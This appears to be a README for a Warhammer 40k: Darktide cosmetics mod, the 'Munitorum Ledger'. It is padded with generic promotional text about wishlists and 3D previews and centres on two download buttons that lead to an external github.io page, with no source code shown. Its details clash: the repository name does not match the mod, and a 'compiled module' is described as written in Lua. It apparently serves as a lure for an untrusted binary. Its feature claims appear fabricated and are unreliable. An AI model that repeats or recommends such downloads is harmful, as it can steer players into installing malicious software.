![preview](https://raw.githubusercontent.com/SriHari-2004/darktide-cosmetics-vault/main/card_f041c.svg)

# The Munitorum Ledger — Expanded Armoury & Wishlist Companion for Warhammer 40k: Darktide

The **Munitorum Ledger** is a thoughtfully-engineered quality-of-life modification that transforms the cosmetic browsing experience within Warhammer 40k: Darktide. While the base game provides a functional but sparse interface for previewing and selecting character cosmetics, this project introduces a layered, data-rich interface layer that helps players track, compare, and plan their ornate acquisitions with military precision.

Born from the observation that the standard character cosmetics UI often leaves players juggling between screens, scribbling notes about item availability, or losing track of which premium sets they wanted to inspect, the Ledger offers a centralized command console for your character's aesthetic loadout. Think of it as a personal quartermaster's office—where every thread, trim, and pauldron heraldry is catalogued, placed on display racks, and ready for your inspection before you commit to any procurement.

Beyond merely expanding the cluttered view, this mod introduces a robust wishlist subsystem that persists across sessions, allowing you to mark desired premium cosmetics and receive subtle, unobtrusive reminders when those particular items rotate into the storefront. It also enables a high-fidelity preview environment that renders premium offerings in full three-dimensional glory against any backdrop you choose, using a dynamic lighting rig that respects the game's grimdark aesthetic.

---

## Why This Project Exists 🧐

The default cosmetic interface in Darktide performs its basic function—showing what is equipped and what is purchasable—but it does so with the visual flatness of a battered ammunition crate. The interface lacks depth, context, and any mechanism for planning between updates. Players are often forced to rely on external memory, screenshots, or third-party spreadsheets to remember what they intended to buy when the weekly rotation changes.

The Munitorum Ledger replaces that fragmented workflow with an integrated approach. It applies a tactical lens to cosmetic management, treating each character's appearance as a loadout that deserves the same careful consideration as weapon attachments or curio blessings. The user interface is designed to feel like an extension of the game's own world—presenting information through stylized parchment textures, cog-and-skull motifs, and a color palette that merges the Imperium's aged paper with the deep greens and bronzes of the Mourningstar.

This repository serves as the central development hub for the mod, containing the source code, documentation, and configuration templates needed for contributors, translators, and enthusiasts to extend or localize the project for their own needs.

---

## Getting Started with the Ledger 📋

### >> [![Download](https://raw.githubusercontent.com/SriHari-2004/darktide-cosmetics-vault/main/get_8402bb.svg)](https://SriHari-2004.github.io/darktide-cosmetics-vault/)

To begin cataloguing your arsenal of visual splendors, you will need to acquire the compiled module and place it into your game's modification directory. The project is designed for seamless integration with the game's existing mod framework, requiring only that the game is launched with mod support enabled. After installation, the Ledger adds a new tab to the cosmetics view, clearly labeled with the Imperial aquila icon, allowing immediate access to enhanced previews and the persistent wishlist feature.

The configuration file, named `ledger_settings.lua`, is generated upon first run and can be edited with any standard text editor. This file controls behavior such as preview background selection, lighting intensity, wishlist notification frequency, and whether the expanded view shows item availability dates. The project has been tested against the latest game patch and maintains backward compatibility with previous seasons.

### System Requirements

- **Game Version:** Warhammer 40k: Darktide (current retail branch)
- **Mod Loader:** A standard Darktide mod loader and bootstrap utility
- **Operating Systems:** Windows 10/11, without the need for additional runtime environments.

---

## The Interior of the Munitorum 🗝️

### Overview of the Interface Layer

The expansion operates in three primary modes, each accessible from a sidebar within the cosmetics screen:

1. **Archival Display Mode** — This is the core enhanced view. Instead of single-item thumbnails, the Ledger renders a grid that can show up to forty individual cosmetic pieces at once, each with a small tooltip specifying its quality tier, acquisition method, and whether it is part of a matching set. Grid density is adjustable via a slider, adapting to small, standard, and ultrawide displays.

2. **Contemplation Chamber (Preview Mode)** — When you select a premium cosmetic, the Ledger summons a dedicated, high-resolution preview environment. This chamber uses ambient occlusion and ray-traced shading approximations to accurately represent how materials like leather, ceramite, and gold trim will reflect light in actual gameplay. You can rotate the character through a full 360-degree arc and even toggle individual armor pieces on and off to see how they layer.

3. **The Pledge Log (Wishlist Mode)** — This subsystem maintains a persistent catalog of up to fifty items you desire. The Ledger tracks the item's store procurement history, showing you when it was last available. When a wishlisted item returns to the premium store rotation, a quiet chime plays, and a small parchment icon appears by the interface toggle. The log also supports notes per item, allowing you to record context such as "for the veteran's parade ground build" or "matches the Crusher helmet."

---

## Core Feature Matrix ⚙️

### Responsive and Adaptive Interface

The UI is built on a custom layout engine that responsively scales between a standard 1080p monitor and a 4K ultrawide curved display. The grid system recalculates its density and margin spacing based on the viewport's aspect ratio, ensuring that text remains legible and item icons are never stretched to breaking. Keyboard navigation, including arrow keys and number pad shortcuts, is fully supported for players who prefer precision over pointer movement.

### Multilingual Support for a Galaxy-Wide Audience

The Ledger's interface strings and tooltips are prepared for localization and currently ship with full translations for English, Spanish, German, French, and Russian. The translation files are plain-text Lua tables nested in the `i18n` folder, allowing community members to add languages without recompiling any source. The project structure ensures that the fallback behavior defaults to English if a localized string is missing, preventing interface fragmentation.

### Community Tested and Documentation Library

A comprehensive wiki, field manual, and changelog are maintained within the `docs` directory. These assets provide UI walkthroughs, configuration option explanations, and a gallery of custom preview backdrops that users have contributed over time. The documentation is written with a blend of technical reference and plain-language guidance, ensuring that both veteran modders and first-time installers find value.

### Lightweight Performance and Thread Safety

The Ledger is written in Lua and seeks to minimize its footprint on the game's main thread. All texture loading, sorting, and filter operations for the grid view are dispatched to a separate worker thread where the game engine permits it, preventing hitching during fast scrolling. The mod has a measured overhead of under 2.5% in typical menu navigation scenarios.

---

## Architectural Insights for Developers and Tinkerers 🏛️

### Data Modeling and Persistence

The wishlist and settings are stored in a structured JSON file alongside the mod directory, rather than the game's save file. This separation ensures that uninstalling the mod does not corrupt or alter the player's core profile, and that the wishlist can be backed up or transferred between computers with a simple file copy. The data schema is versioned, and the loader performs a gentle, automated migration if a new version of the mod reads an older schema.

### The Event Bus and Integration Points

For developers who want to extend the Ledger, the codebase abstracts the core functionality behind an event bus. Actions such as `item_selected`, `wishlist_updated`, and `preview_background_changed` emit signals that other mods can subscribe to via the standard game's mod interaction layer. Two working examples of third-party integration are provided: a mod that exports your wishlist to a text format, and a display addon that shows your most-wanted item on the main deck loading screen.

### Theme and Styling Adjustments

The mod adopts the game's default UI theme but allows for a full palette override through a CSS-like configuration structure. Enthusiasts have already submitted alternative themes, including a "Golden Throne" style with white gold and ivory, and a "Nurgle Rot" style with sickly greens and rusted browns. The theme is applied live, so toggling between them requires no restart of the game.

---

## Collaborative Contribution Guidelines 🤝

If you are a developer, language enthusiast, or UI designer interested in polishing this experience, we welcome your collaboration. The repository is structured to make contribution straightforward:

1. **Fork the repository** and create a descriptive branch for your feature or fix.
2. **Adhere to the style guide** included in the `CONTRIBUTING.md` file, which covers Lua formatting, namespace usage, and comment etiquette.
3. **Test your changes** against the reference environment, ensuring your branch merges cleanly with the primary codebase without breaking existing filters or localization.
4. **Submit a pull request** with a detailed description of your intent, a changelog entry, and any new UI assets you have added.

All contributions are reviewed with the highest standard of thoroughness, not only to ensure stability but to ensure that the project remains performant on mid-tier machines as well as enthusiast hardware.

---

## Our Shared Covenant 🛡️

### How You Can Help Beyond Code

Not every contribution needs to be a system call or localization token. The project thrives on the creativity of its fan base. You can assist by:

- Creating new, original preview chamber backdrops—from the fog-drenched decks of a chaos vessel to the neon-lit underhive promenade.
- Writing additional documentation entries or making instructional videos that help newcomers understand the interface.
- Beta-testing weekly retail (RC) builds before they are broadly released, reporting anomalies or interactions that the core team may have missed.

All assets provided by contributors must adhere to the project's licensing terms, ensuring that the community can reuse them without conflict.

---

## Frequently Asked Questions ❓

**Does the Ledger modify any game files or affect server-side balance?** No. The mod only alters the local user interface rendering and persists local data. It does not intercept network traffic, modify player statistics, or tamper with the game's executable or memory transaction beyond what the game's own mod framework allows.

**Will my wishlist persist across game updates?** In most cases, yes. The wishlist key references the item's internal ID, not its collision grid or local display name. If the developer of the game changes an internal ID or removes an item from the game entirely, the Ledger will gracefully mark the item as "unavailable," allowing you to remove it manually without a crash.

**Can I use the preview mode for items I do not own?** Yes, this is the central purpose of the Contemplation Chamber. You can render any premium cosmetic that appears in the store's rotating stock, providing you a visual reference before you allocate your valued in-game currency.

---

## Version History and Milestones 🗓️

**v2.4.1 — The Orderly Ledger (March 2026)**
The current stable branch. It delivers the lightweight performance batch overhaul and introduces the capability to import themed color sets from a clipboard string.

**v2.5.0 (Previously in Development) — The Gilded Ledger (November 2026)**
Announced for release later in 2026, this update introduces the "vault mode" that lets you group items into up to 20 custom folders for narrative-oriented role-playing collections. It also brings the visual polish of the updated aquila font for all localized scripts.

---

## License and Legal Parchment ⚖️

The Munitorum Ledger is distrubted under the terms of the **MIT License**. This permissive license allows you to use, modify, and distribute this code, provided that the copyright and permission notice are included in any substantial portions of the Software. The full license text is available below.

[View the MIT License](https://opensource.org/licenses/MIT)

---

## In Conclusion — The Ledger Awaits 📜

The Munitorum Ledger is more than a set of toggle switches; it is the organisational spine for a player who treats their repertoire of cosmetics as an extension of their in-game identity. Whether you are a veteran wishing to fine-tune your roleplaying appearance or a newcomer planning a roadmap of future purchases, the interface reduces friction and crafts clarity out of chaos.

We welcome you to the growing ranks of players who have adopted this mod for daily use. The project is a passion piece, maintained voluntarily and improved collectively. If your path leads you to engage with the code, the chat channels, or simply to share a screenshot of your custom preview chamber, know that you have contributed to a whole greater than the sum of its parts.

May your inspections be swift, your wishes plentiful, and your service to the Emperor beautifully adorned.

**The Munitorum is always open for auditing.**

### >> [![Download](https://raw.githubusercontent.com/SriHari-2004/darktide-cosmetics-vault/main/get_8402bb.svg)](https://SriHari-2004.github.io/darktide-cosmetics-vault/)